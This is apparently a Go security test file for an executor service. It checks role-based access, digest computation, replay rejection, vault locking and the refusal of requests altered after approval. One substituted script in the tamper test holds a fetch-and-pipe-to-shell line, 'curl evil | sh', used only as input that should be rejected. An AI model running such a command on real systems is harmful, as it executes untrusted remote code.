// SPDX-License-Identifier: AGPL-3.0-or-later

package security

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"testing"

	"google.golang.org/grpc/codes"

	"github.com/nebula-operation-station/nebula-operation-station/internal/peercred"
	"github.com/nebula-operation-station/nebula-operation-station/internal/permit"
	pb "github.com/nebula-operation-station/nebula-operation-station/internal/rpc/executorv1"
)

// Milestone 0 acceptance criteria (docs/spec/16-milestones.md):
//   - the server user cannot read executor files          -> privileged_test.go
//   - an unknown UID is rejected                           -> here and privileged_test.go
//   - a script, host list or parameter swapped after approval is rejected
//   - a replayed assertion is rejected

func TestM0_UnknownUIDIsRejected(t *testing.T) {
	other := uint32(os.Getuid()) + 1
	h := newHarness(t, harnessOptions{uidRoles: map[uint32][]peercred.Role{other: {peercred.RoleServer, peercred.RoleAdmin}}})
	_, err := h.client.GetStatus(h.ctx(), &pb.GetStatusRequest{})
	wantCode(t, err, codes.PermissionDenied, "may not call")
	_, err = h.client.Unlock(h.ctx(), &pb.UnlockRequest{Passphrase: []byte(passphrase)})
	wantCode(t, err, codes.PermissionDenied, "")
}

func TestM0_ServerRoleCannotUseAdminMethods(t *testing.T) {
	h := newHarness(t, harnessOptions{uidRoles: map[uint32][]peercred.Role{uint32(os.Getuid()): {peercred.RoleServer}}})
	_, err := h.client.Unlock(h.ctx(), &pb.UnlockRequest{Passphrase: []byte(passphrase)})
	wantCode(t, err, codes.PermissionDenied, "")
	_, err = h.client.ListPending(h.ctx(), &pb.ListPendingRequest{})
	wantCode(t, err, codes.PermissionDenied, "")
	_, err = h.client.ApproveCLI(h.ctx(), &pb.ApproveCLIRequest{ExecutionDigest: "00"})
	wantCode(t, err, codes.PermissionDenied, "")
	// Locking is always allowed for the server: it only removes capability.
	if _, err := h.client.Lock(h.ctx(), &pb.LockRequest{}); err != nil {
		t.Fatalf("server lock: %v", err)
	}
}

func TestM0_AdminRoleCannotUseServerMethods(t *testing.T) {
	h := newHarness(t, harnessOptions{uidRoles: map[uint32][]peercred.Role{uint32(os.Getuid()): {peercred.RoleAdmin}}})
	_, err := h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: h.request(pb.RiskClass_RISK_CLASS_MEDIUM)})
	wantCode(t, err, codes.PermissionDenied, "")
	_, err = h.client.AuthorizeRun(h.ctx(), run("00", "dockerflux", fpA))
	wantCode(t, err, codes.PermissionDenied, "")
}

func TestM0_ExecutorComputesTheDigestItself(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	p := h.propose(h.request(pb.RiskClass_RISK_CLASS_MEDIUM))
	sum := sha256.Sum256(p.GetCanonicalRequest())
	if hex.EncodeToString(sum[:]) != p.GetExecutionDigest() {
		t.Fatal("digest is not the SHA-256 of the returned canonical request")
	}
	if len(p.GetChallenge()) != 32 {
		t.Fatalf("challenge length %d", len(p.GetChallenge()))
	}
}

func TestM0_SubstitutionAfterApprovalIsRejected(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	h.unlock()
	h.openSession()
	p := h.approvedMedium()
	d := p.GetExecutionDigest()

	swaps := map[string]func(*pb.AuthorizeRunRequest){
		"script":           func(r *pb.AuthorizeRunRequest) { r.Artifact = []byte("#!/bin/sh\ncurl evil | sh\n") },
		"parameters":       func(r *pb.AuthorizeRunRequest) { r.ParametersJson = []byte(`{"packages":["openssh-server"]}`) },
		"host not in list": func(r *pb.AuthorizeRunRequest) { r.HostId = "netbird-vps" },
		"host key":         func(r *pb.AuthorizeRunRequest) { r.HostKeyFingerprint = fpB },
		"action":           func(r *pb.AuthorizeRunRequest) { r.ActionId = "system.reboot" },
		"module version":   func(r *pb.AuthorizeRunRequest) { r.ModuleVersion = "9.9.9" },
	}
	for name, swap := range swaps {
		t.Run(name, func(t *testing.T) {
			r := run(d, "dockerflux", fpA)
			swap(r)
			_, err := h.client.AuthorizeRun(h.ctx(), r)
			wantCode(t, err, codes.PermissionDenied, "")
		})
	}

	// Unapproved credential: rejected before the permit is consulted.
	r := run(d, "dockerflux", fpA)
	r.CredentialRef = "some-other-key"
	_, err := h.client.AuthorizeRun(h.ctx(), r)
	wantCode(t, err, codes.FailedPrecondition, "credential_unavailable")

	// The legitimate run still works after all rejected attempts, once.
	if _, err := h.client.AuthorizeRun(h.ctx(), run(d, "dockerflux", fpA)); err != nil {
		t.Fatalf("legitimate run: %v", err)
	}
	_, err = h.client.AuthorizeRun(h.ctx(), run(d, "dockerflux", fpA))
	wantCode(t, err, codes.PermissionDenied, string(permit.CodeHostAlreadyRun))
}

func TestM0_ChangedRequestNeedsNewApproval(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	h.openSession()
	r := h.request(pb.RiskClass_RISK_CLASS_MEDIUM)
	p := h.propose(r)

	// Same execution ID with one more host: refused outright.
	r.ResolvedTargets = append(r.ResolvedTargets, &pb.Target{HostId: "netbird-vps", HostKeyFingerprint: fpA})
	_, err := h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: r})
	wantCode(t, err, codes.AlreadyExists, "")

	// A new request with a new ID gets a new digest and a new challenge, and
	// the assertion for the old one does not approve it.
	r2 := h.request(pb.RiskClass_RISK_CLASS_MEDIUM)
	r2.ResolvedTargets = append(r2.ResolvedTargets, &pb.Target{HostId: "netbird-vps", HostKeyFingerprint: fpA})
	p2 := h.propose(r2)
	if p2.GetExecutionDigest() == p.GetExecutionDigest() {
		t.Fatal("different request, same digest")
	}
	_, err = h.client.SubmitAssertion(h.ctx(), &pb.SubmitAssertionRequest{ExecutionDigest: p2.GetExecutionDigest(), AssertionJson: h.sign(p.GetChallenge())})
	wantCode(t, err, codes.PermissionDenied, string(permit.CodeAssertionRejected))
}

func TestM0_ReplayedAssertionIsRejected(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	h.openSession()

	p := h.propose(h.request(pb.RiskClass_RISK_CLASS_MEDIUM))
	assertion := h.sign(p.GetChallenge())
	if _, err := h.client.SubmitAssertion(h.ctx(), &pb.SubmitAssertionRequest{ExecutionDigest: p.GetExecutionDigest(), AssertionJson: assertion}); err != nil {
		t.Fatal(err)
	}
	// Same assertion, same permit.
	_, err := h.client.SubmitAssertion(h.ctx(), &pb.SubmitAssertionRequest{ExecutionDigest: p.GetExecutionDigest(), AssertionJson: assertion})
	wantCode(t, err, codes.FailedPrecondition, string(permit.CodeWrongState))

	// Same assertion, different permit.
	other := h.propose(h.request(pb.RiskClass_RISK_CLASS_MEDIUM))
	_, err = h.client.SubmitAssertion(h.ctx(), &pb.SubmitAssertionRequest{ExecutionDigest: other.GetExecutionDigest(), AssertionJson: assertion})
	wantCode(t, err, codes.PermissionDenied, string(permit.CodeAssertionRejected))

	// Replay of a privileged-session assertion.
	b, err := h.client.BeginPrivilegedSession(h.ctx(), &pb.BeginPrivilegedSessionRequest{})
	if err != nil {
		t.Fatal(err)
	}
	sess := h.sign(b.GetChallenge())
	if _, err := h.client.CompletePrivilegedSession(h.ctx(), &pb.CompletePrivilegedSessionRequest{AssertionJson: sess}); err != nil {
		t.Fatal(err)
	}
	_, err = h.client.CompletePrivilegedSession(h.ctx(), &pb.CompletePrivilegedSessionRequest{AssertionJson: sess})
	wantCode(t, err, codes.FailedPrecondition, string(permit.CodeNoChallenge))
}

func TestM0_LockedExecutorAuthorizesNothing(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	h.openSession()
	p := h.approvedMedium()
	// Never unlocked.
	_, err := h.client.AuthorizeRun(h.ctx(), run(p.GetExecutionDigest(), "dockerflux", fpA))
	wantCode(t, err, codes.FailedPrecondition, "vault_locked")

	h.unlock()
	if _, err := h.client.Lock(h.ctx(), &pb.LockRequest{}); err != nil {
		t.Fatal(err)
	}
	h.unlock()
	// Lock revoked the permit even though the keys are back.
	_, err = h.client.AuthorizeRun(h.ctx(), run(p.GetExecutionDigest(), "dockerflux", fpA))
	wantCode(t, err, codes.NotFound, "")
	st, err := h.client.GetStatus(h.ctx(), &pb.GetStatusRequest{})
	if err != nil {
		t.Fatal(err)
	}
	if st.GetPrivilegedSessionActive() {
		t.Fatal("lock did not end the privileged session")
	}
}

func TestM0_WrongPassphraseDoesNotUnlock(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	_, err := h.client.Unlock(h.ctx(), &pb.UnlockRequest{Passphrase: []byte("wrong")})
	wantCode(t, err, codes.Unauthenticated, "")
	st, err := h.client.GetStatus(h.ctx(), &pb.GetStatusRequest{})
	if err != nil || st.GetUnlocked() {
		t.Fatalf("unlocked after wrong passphrase: %v", err)
	}
}

func TestM0_HardenedModeWithholdsBrowserChallenge(t *testing.T) {
	h := newHarness(t, harnessOptions{mode: permit.ModeHardened})
	h.openSession()
	p := h.propose(h.request(pb.RiskClass_RISK_CLASS_HIGH))
	if p.GetApprovalRequirement() != pb.ApprovalRequirement_APPROVAL_REQUIREMENT_CLI_ONLY {
		t.Fatalf("requirement %v", p.GetApprovalRequirement())
	}
	if len(p.GetChallenge()) != 0 {
		t.Fatal("CLI-only permit must not expose a browser challenge")
	}
	pending, err := h.client.ListPending(h.ctx(), &pb.ListPendingRequest{})
	if err != nil || len(pending.GetPermits()) != 1 {
		t.Fatalf("pending: %v %v", err, pending)
	}
	if got := pending.GetPermits()[0].GetRequest().GetResolvedTargets(); len(got) != 2 {
		t.Fatalf("CLI must see the executor's own target list, got %v", got)
	}
	if _, err := h.client.ApproveCLI(h.ctx(), &pb.ApproveCLIRequest{ExecutionDigest: p.GetExecutionDigest()}); err != nil {
		t.Fatal(err)
	}
}

func TestM0_LowRiskNeedsPrivilegedSession(t *testing.T) {
	h := newHarness(t, harnessOptions{})
	_, err := h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: h.request(pb.RiskClass_RISK_CLASS_LOW)})
	wantCode(t, err, codes.FailedPrecondition, string(permit.CodeSessionRequired))
	_, err = h.client.ProposeExecution(h.ctx(), &pb.ProposeExecutionRequest{Request: h.request(pb.RiskClass_RISK_CLASS_UNSPECIFIED)})
	wantCode(t, err, codes.InvalidArgument, "")
}
